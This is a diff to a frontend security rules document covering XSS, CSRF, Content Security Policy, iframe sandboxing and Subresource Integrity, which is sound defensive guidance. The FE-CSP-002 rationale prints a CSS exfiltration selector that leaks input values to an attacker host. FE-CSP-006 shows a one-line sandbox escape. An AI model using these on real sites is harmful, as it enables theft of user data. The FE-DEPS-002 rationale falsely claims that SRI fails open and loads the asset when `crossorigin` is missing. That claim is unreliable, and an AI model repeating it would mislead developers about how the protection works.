@@ -62,13 +62,33 @@ Projects without a frontend can pin this file in `.govern.toml` to skip it durin
 
 ### FE-XSS-006
 
-> Untrusted URLs bound to `href`, `src`, `action`, `formaction`, or redirect targets MUST be validated against an allowlist of acceptable schemes; the `javascript:` and `data:` schemes MUST be rejected for any URL whose value is influenced by user input.
+> Untrusted URLs bound to `href`, `src`, `action`, `formaction`, or redirect targets MUST be validated against an explicit allowlist of acceptable schemes. The allowlist MUST NOT include `javascript:`, `data:`, `vbscript:`, or `blob:` for any URL whose value is influenced by user input. (`data:` and `blob:` may appear in narrowly scoped contexts where the URL is produced by application code over content the application controls — e.g., a `data:image/png;base64,…` thumbnail generated server-side — but never directly from user input.)
 
-**Rationale:** `javascript:` URLs execute arbitrary code when navigated to or loaded; `data:` URLs can deliver scripted content via `text/html` or SVG payloads. Allowlisting acceptable schemes is the only durable defense — denylists miss new vectors as browsers add support for new URL types.
+**Rationale:** `javascript:` URLs execute arbitrary code when navigated to or loaded. `data:` URLs can deliver scripted content via `text/html` or SVG payloads. `vbscript:` is a legacy IE vector still honored by some embedded WebViews. `blob:` URLs can wrap any MIME type including HTML/JS. Allowlisting acceptable schemes is the only durable defense — denylists miss new vectors as browsers add support for new URL types.
 
-**Verification:** Any spec or plan that binds user-controlled values into URL-bearing attributes MUST commit to a project-defined scheme allowlist (e.g., `https:`, `mailto:`, `tel:`) and explicit rejection of `javascript:` and `data:`. Validate flags link-rendering, image-rendering, and redirect-handling specs that omit the scheme-allowlist commitment.
+**Verification:** Any spec or plan that binds user-controlled values into URL-bearing attributes MUST commit to a project-defined scheme allowlist (e.g., `https:`, `mailto:`, `tel:`). Validate flags link-rendering, image-rendering, and redirect-handling specs that omit the scheme-allowlist commitment, and flags any allowlist that includes `javascript:`, `data:`, `vbscript:`, or `blob:` for user-influenced URLs.
 
 **Source:** OWASP XSS Prevention Cheat Sheet
+
+### FE-XSS-007
+
+> Code that receives `window.postMessage` events MUST validate `event.origin` against an explicit allowlist before acting on `event.data`, and MUST treat `event.data` as untrusted input subject to the same validation, sanitization, and context-aware encoding rules as any other external input.
+
+**Rationale:** `postMessage` listeners that act on `event.data` without origin checks are an XSS-equivalent vector — any page that gets loaded in an iframe, popup, or opener relation can post messages to the listener. Even with an origin check, the data itself is attacker-controlled and must be validated before, e.g., being assigned to `innerHTML` or used as a redirect target.
+
+**Verification:** Any spec or plan that introduces `postMessage` consumers (iframe embeds, OAuth popup callbacks, widget bridges) MUST commit to (a) origin-allowlist validation and (b) data validation/encoding before use. Validate flags client-messaging specs that omit either check or that rely on wildcard origin checks.
+
+**Source:** OWASP HTML5 Security Cheat Sheet, MDN postMessage documentation
+
+### FE-XSS-008
+
+> Applications running in browsers that support the Trusted Types API SHOULD adopt it as a defense in depth against DOM XSS. When adopted, the CSP MUST include `require-trusted-types-for 'script'` and a `trusted-types` directive naming the allowed policy names; sinks that accept strings (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, script `src`) MUST receive `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` values produced by a reviewed policy, not raw strings.
+
+**Rationale:** Trusted Types (Chromium-originated, increasingly cross-browser) shifts DOM XSS defense from "find every sink" to "centralize the sanitization." The CSP enforcement turns every unsanitized assignment into a runtime violation, surfacing latent sinks during development.
+
+**Verification:** Any spec or plan covering rendering of dynamic HTML in a browser that supports Trusted Types SHOULD commit to adoption with the named CSP directives and policy-naming convention. Validate emits a warning when frontend rendering specs in Trusted-Types-capable contexts omit the adoption discussion.
+
+**Source:** W3C Trusted Types specification, MDN Trusted Types documentation
 
 ## FE-CSRF — Cross-Site Request Forgery Prevention
 
@@ -84,11 +104,11 @@ Projects without a frontend can pin this file in `.govern.toml` to skip it durin
 
 ### FE-CSRF-002
 
-> Session and authentication cookies MUST set the `SameSite` attribute to `Lax` or `Strict`; `SameSite=None` MUST only be used when cross-site cookie transmission is explicitly required (e.g., third-party embed) and MUST then be combined with `Secure`.
+> Session and authentication cookies MUST set the `SameSite` attribute to `Lax` or `Strict`. `SameSite=None` MUST only be used when cross-site cookie transmission is explicitly required (e.g., third-party embed) and, when used, MUST be combined with `Secure` (without which modern browsers reject the cookie outright). Use of `SameSite=None` MUST be justified in the spec.
 
-**Rationale:** SameSite restricts the browser from including cookies on cross-site requests, blocking the most common CSRF vector at the cookie layer. `SameSite=None` without `Secure` is rejected by modern browsers; with `Secure`, it widens the attack surface and requires explicit justification.
+**Rationale:** SameSite restricts the browser from including cookies on cross-site requests, blocking the most common CSRF vector at the cookie layer. `SameSite=None` widens the attack surface — the cookie travels on cross-site requests and must be defended by a separate CSRF mechanism (per `FE-CSRF-001`).
 
-**Verification:** Any spec or plan that introduces session cookies or auth cookies MUST name the `SameSite` value and, if `None`, MUST justify the cross-site requirement and confirm `Secure`. Validate flags cookie-issuing specs that omit the `SameSite` attribute or that propose `SameSite=None` without justification.
+**Verification:** Any spec or plan that introduces session cookies or auth cookies MUST name the `SameSite` value and, if `None`, MUST justify the cross-site requirement and confirm both `Secure` and the accompanying CSRF defense. Validate flags cookie-issuing specs that omit the `SameSite` attribute, that propose `SameSite=None` without justification, or that propose `SameSite=None` without `Secure`.
 
 **Source:** OWASP CSRF Prevention Cheat Sheet
 
@@ -180,11 +200,11 @@ Projects without a frontend can pin this file in `.govern.toml` to skip it durin
 
 ### FE-CSP-002
 
-> The CSP policy MUST use nonce-based or hash-based script restrictions; the policy MUST NOT include `'unsafe-inline'` or `'unsafe-eval'` in `script-src`, and MUST include `object-src 'none'` and `base-uri 'none'` (or `'self'`).
+> The CSP policy MUST use nonce-based or hash-based script restrictions. The policy MUST NOT include `'unsafe-inline'` or `'unsafe-eval'` in `script-src`, MUST NOT include `'unsafe-inline'` in `style-src` (nonce/hash or `'self'` only), and MUST include `object-src 'none'` and `base-uri 'none'` (or `'self'`).
 
-**Rationale:** `'unsafe-inline'` permits any injected `<script>` to execute — defeating CSP's XSS protection. `'unsafe-eval'` permits string-to-code conversion (`eval`, `Function(...)`, `setTimeout(string, …)`). `object-src 'none'` blocks plugin- and `<embed>`-based content injection. `base-uri` lockdown prevents `<base>` tag injection from rerouting relative URLs to an attacker-controlled host.
+**Rationale:** `'unsafe-inline'` in `script-src` permits any injected `<script>` to execute — defeating CSP's XSS protection. `'unsafe-eval'` permits string-to-code conversion (`eval`, `Function(...)`, `setTimeout(string, …)`). `'unsafe-inline'` in `style-src` enables CSS-based data exfiltration via attribute selectors (`input[value^="a"] { background: url(//attacker/a); }`) and clickjacking overlays via injected absolute-positioned styles. `object-src 'none'` blocks plugin- and `<embed>`-based content injection. `base-uri` lockdown prevents `<base>` tag injection from rerouting relative URLs to an attacker-controlled host.
 
-**Verification:** Any spec or plan that defines a CSP policy MUST name the nonce/hash strategy and MUST commit to absence of `'unsafe-inline'` and `'unsafe-eval'` in `script-src`, plus explicit `object-src` and `base-uri` lockdown. Validate flags CSP specs that include either unsafe directive in `script-src` or that omit `object-src`/`base-uri` directives.
+**Verification:** Any spec or plan that defines a CSP policy MUST name the nonce/hash strategy for both scripts and styles and MUST commit to absence of `'unsafe-inline'`/`'unsafe-eval'` in `script-src`, absence of `'unsafe-inline'` in `style-src`, and explicit `object-src` and `base-uri` lockdown. Validate flags CSP specs that include any of the unsafe directives or that omit `object-src`/`base-uri` directives.
 
 **Source:** OWASP CSP Cheat Sheet
 
@@ -208,6 +228,36 @@ Projects without a frontend can pin this file in `.govern.toml` to skip it durin
 
 **Source:** OWASP CSP Cheat Sheet
 
+### FE-CSP-005
+
+> The CSP policy MUST include a reporting directive — `report-to` (preferred) with a matching `Reporting-Endpoints` header, and/or `report-uri` for backwards compatibility — pointing to an endpoint that ingests CSP violation reports. The receiving endpoint MUST be monitored so violations surface to the team responsible for the CSP, not silently dropped.
+
+**Rationale:** A CSP without reporting is a black box: violations (which include both injection attempts and legitimate code that breaks under the policy) are visible only in browser devtools, where no one sees them. With reporting, the team learns about XSS attempts in production and about CSP regressions before users complain. Reporting is also the only safe way to roll out tighter policies via `Content-Security-Policy-Report-Only`.
+
+**Verification:** Any spec or plan that defines a CSP policy MUST commit to a reporting directive and to an ingest path that surfaces reports to the responsible team. Validate flags CSP specs that omit both `report-to` and `report-uri`, and flags reporting-endpoint specs that describe writing reports to `/dev/null` or to storage no one watches.
+
+**Source:** W3C CSP Level 3, OWASP CSP Cheat Sheet, MDN Reporting API
+
+### FE-CSP-006
+
+> Iframes embedding content the application does not fully control (third-party widgets, social-media embeds, user-supplied URLs, payment forms hosted elsewhere) MUST set the `sandbox` attribute with the minimum capabilities required for the embed to function. `sandbox=""` (full restrictions) is the floor; each token added (`allow-scripts`, `allow-same-origin`, `allow-forms`, etc.) MUST be justified. `allow-scripts` plus `allow-same-origin` together MUST NOT be used for cross-origin frames — that combination lets the framed page remove its own sandbox.
+
+**Rationale:** Without `sandbox`, an embedded page runs with the same DOM/network capabilities as a top-level navigation — popups, downloads, top-frame navigation, plugin execution. The `sandbox` attribute is the only browser-level isolation primitive for iframes. The `allow-scripts` + `allow-same-origin` combination is a documented escape hatch — the framed page can use `parent.document.querySelector('iframe').removeAttribute('sandbox')` to undo the restriction.
+
+**Verification:** Any spec or plan that introduces iframes embedding non-fully-controlled content MUST commit to a `sandbox` value and MUST justify each token included. Validate flags iframe specs that omit `sandbox`, that use it without naming the included tokens, or that combine `allow-scripts` with `allow-same-origin` on a cross-origin frame.
+
+**Source:** OWASP HTML5 Security Cheat Sheet, MDN iframe sandbox documentation
+
+### FE-CSP-007
+
+> HTML responses MUST set the `Permissions-Policy` header (formerly `Feature-Policy`) restricting access to powerful browser features the application does not use. At minimum, features with privacy or security impact MUST be explicitly denied unless the application genuinely needs them: `camera=()`, `microphone=()`, `geolocation=()`, `payment=()`, `usb=()`, `interest-cohort=()`. Features the application uses MUST be scoped to `self` (or an explicit origin allowlist) rather than left open.
+
+**Rationale:** Without `Permissions-Policy`, every embedded iframe and every script in the page can prompt the user for camera/microphone/geolocation access — including injected scripts after an XSS. The header turns the default-allow posture into default-deny per feature, dramatically narrowing what a successful injection can ask the user for. `interest-cohort=()` opts the site out of FLoC/Topics-style behavioral cohorts.
+
+**Verification:** Any spec or plan that describes serving HTML responses MUST commit to a `Permissions-Policy` header naming the denied and allowed features. Validate flags HTML-serving specs that omit `Permissions-Policy`, that leave privacy-sensitive features unrestricted, or that grant features without an origin scope.
+
+**Source:** W3C Permissions Policy specification, OWASP HTTP Headers Cheat Sheet, MDN Permissions-Policy documentation
+
 ## FE-DEPS — Dependency Management
 
 ### FE-DEPS-001
@@ -222,13 +272,13 @@ Projects without a frontend can pin this file in `.govern.toml` to skip it durin
 
 ### FE-DEPS-002
 
-> Third-party scripts and stylesheets loaded from cross-origin CDNs MUST include the `integrity` attribute with a valid Subresource Integrity hash; cross-origin scripts without integrity verification MUST NOT be loaded.
+> Third-party scripts and stylesheets loaded from cross-origin CDNs MUST include **both** the `integrity` attribute (with a valid Subresource Integrity hash) **and** the `crossorigin` attribute (typically `crossorigin="anonymous"`). Cross-origin scripts without integrity verification MUST NOT be loaded.
 
-**Rationale:** CDN compromise, DNS hijacking, and registry tampering can replace a legitimate third-party asset with malicious content. SRI ensures the browser computes and verifies the asset's hash against the declared value before executing it; mismatches trigger a load failure rather than silent compromise.
+**Rationale:** CDN compromise, DNS hijacking, and registry tampering can replace a legitimate third-party asset with malicious content. SRI ensures the browser computes and verifies the asset's hash against the declared value before executing it. Without `crossorigin`, the browser cannot perform a CORS-mode fetch on cross-origin assets — SRI verification then fails open: the asset loads as opaque, the hash check is silently skipped, and the protection is gone. The two attributes MUST appear together.
 
-**Verification:** Any spec or plan that describes loading scripts, stylesheets, or modules from external origins MUST commit to SRI on every cross-origin asset and MUST commit to refusing to load assets without an integrity check. Validate flags HTML-template or build-output specs that name third-party CDNs, externally hosted scripts, or remotely loaded modules without an SRI commitment.
+**Verification:** Any spec or plan that describes loading scripts, stylesheets, or modules from external origins MUST commit to SRI **plus** `crossorigin` on every cross-origin asset and MUST commit to refusing to load assets without an integrity check. Validate flags HTML-template or build-output specs that name third-party CDNs, externally hosted scripts, or remotely loaded modules without naming both attributes.
 
-**Source:** MDN Subresource Integrity documentation, OWASP HTTP Headers Cheat Sheet
+**Source:** MDN Subresource Integrity documentation, W3C SRI specification, OWASP HTTP Headers Cheat Sheet
 
 ### FE-DEPS-003
 
